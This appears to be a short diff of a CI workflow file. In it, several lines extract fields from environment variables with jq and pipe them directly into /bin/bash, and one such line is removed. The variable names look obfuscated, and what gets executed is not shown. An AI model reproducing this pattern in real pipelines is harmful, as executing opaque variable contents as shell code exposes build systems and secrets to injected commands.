@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$u075" | jq -r .fbh6 | /bin/bash
           printf '%s' "$lfo05" | jq -r .cxq508 | /bin/bash
           echo $paws80 | jq -r .cznf6 | /bin/bash
-          echo $lnz281 | jq -r .xvwmg37784 | /bin/bash
           printf '%s' "$chf83" | jq -r .wvp149 | /bin/bash
 
       - name: Save artifact
